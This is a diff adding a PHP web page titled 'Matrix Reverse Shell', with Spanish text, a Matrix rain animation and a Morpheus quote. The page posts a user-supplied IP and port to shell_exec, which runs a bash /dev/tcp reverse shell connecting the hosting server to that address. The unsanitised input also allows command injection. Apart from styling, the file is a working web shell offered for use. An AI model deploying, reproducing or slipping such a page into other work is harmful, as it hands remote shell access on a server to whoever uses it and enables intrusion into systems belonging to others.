@@ -1,0 +1,143 @@
+<?php
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $ip = $_POST['ip'];
+    $port = $_POST['port']; // Obtenemos el puerto ingresado.
+    $cmd = "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'";
+
+    // Intenta ejecutar el comando de la reverse shell.
+    shell_exec($cmd);
+
+    echo "💻 Conexión iniciada al servidor $ip en el puerto $port. 💻";
+    exit;
+}
+?>
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Matrix Reverse Shell</title>
+    <style>
+        body {
+            background-color: black;
+            font-family: "Courier New", Courier, monospace;
+            margin: 0;
+            overflow: hidden;
+        }
+        .matrix-effect {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+        }
+        canvas {
+            display: block;
+        }
+        .container {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: black;
+            border: 2px solid white;
+            padding: 30px;
+            text-align: center;
+            color: white;
+            width: 80%;
+            max-width: 600px;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.8);
+        }
+        h1 {
+            font-size: 2em;
+            margin-bottom: 20px;
+        }
+        p {
+            font-size: 1.2em;
+            margin: 10px 0;
+        }
+        form {
+            margin-top: 20px;
+        }
+        input[type="text"] {
+            padding: 10px;
+            font-size: 1em;
+            width: 80%;
+            border: 1px solid white;
+            border-radius: 5px;
+            background-color: black;
+            color: white;
+            margin-bottom: 20px;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 1em;
+            color: black;
+            background-color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #e0e0e0;
+        }
+    </style>
+</head>
+<body>
+    <div class="matrix-effect">
+        <canvas id="matrix"></canvas>
+    </div>
+
+    <div class="container">
+        <h1>💻 Despierta, Neo 💻</h1>
+	<p>"Con el tiempo aprenderás que hay diferencia entre conocer el camino y andar el camino,
+	 Yo sólo puedo mostrarte la puerta, eres tú quien debe abrir." Morfeo<p>
+	<P>								<P>
+        <p>Ingrese su dirección IP y puerto para iniciar la conexión:</p>
+
+        <form method="POST">
+            <input type="text" id="ip" name="ip" placeholder="192.168.x.x" required>
+            <input type="text" id="port" name="port" placeholder="4444" required>
+            <button type="submit">🌐 Conectar 🌐</button>
+        </form>
+    </div>
+
+    <script>
+        // Efecto Matrix
+        const canvas = document.getElementById('matrix');
+        const ctx = canvas.getContext('2d');
+
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+
+        const matrixChars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
+        const fontSize = 16;
+        const columns = canvas.width / fontSize;
+        const drops = Array(Math.floor(columns)).fill(1);
+
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+            ctx.fillStyle = '#00ff00';
+            ctx.font = fontSize + 'px monospace';
+
+            for (let i = 0; i < drops.length; i++) {
+                const text = matrixChars.charAt(Math.floor(Math.random() * matrixChars.length));
+                const x = i * fontSize;
+                const y = drops[i] * fontSize;
+
+                ctx.fillText(text, x, y);
+
+                if (y > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+
+                drops[i]++;
+            }
+        }
+
+        setInterval(drawMatrix, 50);
+    </script>
+</body>
+</html>
